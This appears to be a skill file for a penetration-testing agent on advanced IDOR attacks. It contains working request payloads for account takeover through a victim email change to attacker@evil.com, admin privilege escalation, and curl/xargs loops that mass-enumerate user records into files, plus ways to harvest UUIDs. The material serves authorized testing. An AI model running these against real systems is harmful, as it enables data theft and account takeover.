---
name: idor-advanced
description: Advanced IDOR techniques — chained IDOR, blind IDOR, indirect references, and mass IDOR exploitation
---

# IDOR (Advanced)

Expanding on basic IDOR, this covers finding non-obvious object references, chaining IDOR with other vulnerabilities for higher impact, mass enumeration techniques, and IDOR in non-standard contexts (GraphQL, WebSocket, API parameters).

## Non-Obvious Object References

### Indirect References

```
# Hash/UUID instead of integer:
/api/profile/550e8400-e29b-41d4-a716-446655440000  → victim's UUID

# Encoded references:
/api/file/aGVsbG8ud29yZA==  → base64 decoded = hello.doc

# Custom encoding:
/api/order/TXktT3JkZXItMTIzNA==  → decode to find predictable ID

# Hash of user ID:
/api/data/md5(user_id)  → try MD5 of known IDs

# Compound keys:
/api/message/USER_ID:MESSAGE_ID  → change USER_ID
```

### Hidden Parameters

```
# Hidden fields in forms:
<input type="hidden" name="user_id" value="123">

# JavaScript variables:
window._userId = 123;
var config = {userId: 123, role: "user"};

# JWT payload:
{"sub": "123", "user_id": 123}  → modify sub/user_id

# Cookie values:
user=eyJ1c2VyX2lkIjogMTIzfQ==  → base64 decode, modify, re-encode
```

### IDOR in Request Body

```json
# Standard JSON body:
{"user_id": 123, "action": "view_profile"}

# Nested objects:
{"data": {"owner": {"id": 123}}}

# Arrays:
{"user_ids": [123, 456]}  → replace own ID with victim's

# GraphQL variables:
{"query": "mutation { ... }", "variables": {"userId": 123}}
```

### IDOR in Unusual Locations

```
# Request headers:
X-User-ID: 123
X-Account-ID: 456
X-Resource-ID: 789

# WebSocket messages:
{"type": "subscribe", "channel": "user-123-notifications"}

# URL path vs body mismatch:
PUT /api/users/123/profile
{"user_id": 456, "email": "newemail@x.com"}
# Does server use URL param (123) or body param (456)?

# File paths:
/download?file=/users/123/report.pdf  → change 123
/api/export?userId=123
```

## IDOR Patterns in APIs

### REST API Patterns

```
# Standard CRUD:
GET    /api/v1/users/{id}
PUT    /api/v1/users/{id}
DELETE /api/v1/users/{id}
PATCH  /api/v1/users/{id}/settings

# Relationship endpoints:
GET /api/v1/users/{user_id}/posts
GET /api/v1/users/{user_id}/orders/{order_id}

# Action endpoints:
POST /api/v1/users/{id}/impersonate
POST /api/v1/accounts/{id}/transfer
GET  /api/v1/users/{id}/export

# Admin endpoints with user ID:
GET /api/v1/admin/users/{id}/sessions
```

### State-Based IDOR

```
# Object ID may be valid but in wrong state:
# Your draft order ID vs submitted order ID
# Your pending payment vs completed payment

# Test: access object IDs from a different state than your own
# E.g.: use your own completed order ID → try pending order endpoints
```

## Chained IDOR Attacks

### IDOR → ATO Chain

```
1. IDOR on email-change endpoint:
   PUT /api/users/VICTIM_ID/email {"email": "attacker@evil.com"}
   
2. Trigger password reset for victim@target.com... wait
   (email now goes to attacker@evil.com)
   
3. Receive reset email → click link → set new password → ATO
```

### IDOR → Privilege Escalation

```
1. IDOR on user update:
   PUT /api/users/VICTIM_ID {"role": "admin"}
   → Can you set your own role?
   PUT /api/users/OWN_ID {"role": "admin", "isAdmin": true}

2. If direct privilege change not possible:
   PUT /api/users/ADMIN_ID/team {"member_id": OWN_ID}
   → Add yourself to admin team via IDOR
```

### IDOR → Data Exfiltration

```
# Mass enumeration of users:
for i in {1..10000}; do
  curl -H "Authorization: Bearer TOKEN" \
    https://target.com/api/users/$i | jq .email >> emails.txt
done

# Parallel enumeration (faster):
seq 1 10000 | xargs -P 50 -I{} curl -s \
  -H "Authorization: Bearer TOKEN" \
  "https://target.com/api/users/{}" >> /tmp/users.json
```

## Blind IDOR

### Detection Without Reflected Data

```
# Server returns only success/failure — no data:
DELETE /api/posts/123
→ {"success": true}  # vs 404/403 for others

# Action IDOR:
POST /api/messages/123/read  → marks as read → victim notification disappears
POST /api/subscriptions/123/cancel → victim's subscription cancelled

# Timing-based:
# Response time difference between valid/invalid IDs
```

### Side-Channel IDOR

```
# Error message differences:
/api/files/123 → "Access denied"  (file exists, just not yours)
/api/files/999 → "Not found"  (doesn't exist)
→ Confirms ID 123 belongs to another user

# Response size differences:
# Different status codes (403 vs 404) reveal existence
```

## Mass IDOR Testing

### Enumeration Strategies

```bash
# Sequential IDs:
seq 1 1000 | xargs -P 20 -I{} \
  curl -s -o /dev/null -w "%{http_code} {}\n" \
  -H "Cookie: session=TOKEN" \
  "https://target.com/api/orders/{}"

# UUID enumeration (if predictable):
# UUIDs v1 are time-based → predictable range
python3 -c "import uuid; [print(uuid.uuid1()) for _ in range(100)]"

# IDOR in batch endpoints:
POST /api/users/batch {"ids": [1,2,3,4,5,6,7,8,9,10]}
→ Returns all users' data

# GraphQL aliases (parallel IDOR):
query {
  u1: user(id: "1") { email, phone }
  u2: user(id: "2") { email, phone }
  u3: user(id: "3") { email, phone }
}
```

### Identifying ID Ranges

```
# Check your own account ID from:
- API responses
- URL paths after login
- JWT payload
- Profile page source

# Then test adjacent IDs ±N
# And test ID 1, 2, 3 (admin accounts often have low IDs)
```

## IDOR in File Operations

```
# File download:
/api/download?file_id=123&path=uploads/user_123/report.pdf

# Modify path (path traversal + IDOR):
/api/download?file_id=456&path=uploads/user_456/private.pdf

# Direct file access by name:
/uploads/user_123/contract.pdf → /uploads/user_456/contract.pdf

# Backup file access:
/api/export/user/123.json → /api/export/user/456.json
```

## Testing Methodology

1. **Enumerate all object references** — IDs in URLs, bodies, headers, cookies, JS
2. **Create two accounts** — Account A (attacker) and Account B (victim)
3. **Map all endpoints with IDs** — Every GET/PUT/PATCH/DELETE with resource IDs
4. **Test cross-account access** — Use Account A's token with Account B's IDs
5. **Test vertical IDOR** — Use low-priv token with high-priv IDs (admin user IDs)
6. **Check state variations** — Test IDs in different states
7. **Test write operations** — Modify/delete other users' resources
8. **Test action endpoints** — Email change, delete account, export data with other users' IDs

## Validation

1. Demonstrate accessing another user's private data with your own authentication token
2. Show the specific endpoint, request, and response with victim data
3. For write IDOR: show modification of another user's resource
4. For delete IDOR: show deletion (only in authorized test environment)

## False Positives

- Intentional public data (public profiles, public posts)
- Object belongs to both users (shared resources, team resources)
- Response doesn't actually contain the other user's data
- Rate limiting that prevents meaningful enumeration

## Impact

- Mass data exfiltration of all user PII
- Account takeover via email change + password reset
- Financial impact: access to orders, payments, subscription data
- Reputation damage: unauthorized access to private user content

## Pro Tips

1. Always test WRITE operations (PUT/PATCH/DELETE) — often more severe and missed
2. Check if response differs between "unauthorized" (403) and "not found" (404) → confirms ID exists
3. ID format often reveals the backend: sequential = likely DB auto-increment, UUID = randomized
4. Admin panels often have IDOR on user management endpoints even when APIs are protected
5. Email change IDOR → password reset = P1 ATO without social engineering
6. Test the `/me` endpoint vs `/users/{own_id}` — different code paths, different auth checks
7. Response must contain victim-specific data to be exploitable — just returning 200 is insufficient
8. Batch APIs are goldmines — `POST /api/batch` with a list of IDs often returns all requested resources

## Summary

IDOR is found by systematically replacing your IDs with others' IDs across all endpoints, especially write operations. The highest value is IDOR on email-change, delete-account, or financial endpoints that enable ATO or data loss. Always create two test accounts and use one's token to access the other's resources.


## Harvesting "unpredictable" (UUID/GUID) IDs — ported from WebSkills (idor-403-bypass)

Unpredictable IDs are not un-leakable. Recover other users' UUIDs via:
```
Wayback CDX : https://web.archive.org/cdx/search/cdx?url=*.TARGET/*&output=text&fl=original&collapse=urlkey
AlienVault OTX : https://otx.alienvault.com/api/v1/indicators/{TYPE}/{DOMAIN}/url_list?limit=500
URLScan      : https://urlscan.io/api/v1/search/?q=domain:{DOMAIN}&size=10000
Common Crawl, VirusTotal domain report
Tools        : waymore / waybackurls / gau → regex-extract UUIDs
Google & GitHub search, browser history, web/proxy logs
Referrer header leakage, OAuth "Sign in with" buttons (org UUID in URL)
Clickjacking, accidental screen share, hard-coded IDs in JS/repos
Fixed IDs    : 000...0 / 111...1 for admin/test accounts
Old UUIDs via Wayback → brute-force sequential neighbours
```

### UUID version fingerprint (the `M` digit `xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx`)
| Version | Meaning | Attack note |
|---|---|---|
| 1 | Time + node based | Timestamp + node recoverable → brute the random clock bits (e.g. to forge reset tokens) |
| 3/5 | Name-based (MD5 / SHA-1) | If input is guessable, the UUID is computable |
| 4 | Random | Enumeration infeasible → must leak the value |
| 0 (nil) | `00000000-...` | Often default/test accounts |
Decode tooling: uuidtools.com/decode. Relying on UUIDv1 for sensitive tokens is inherently insecure.
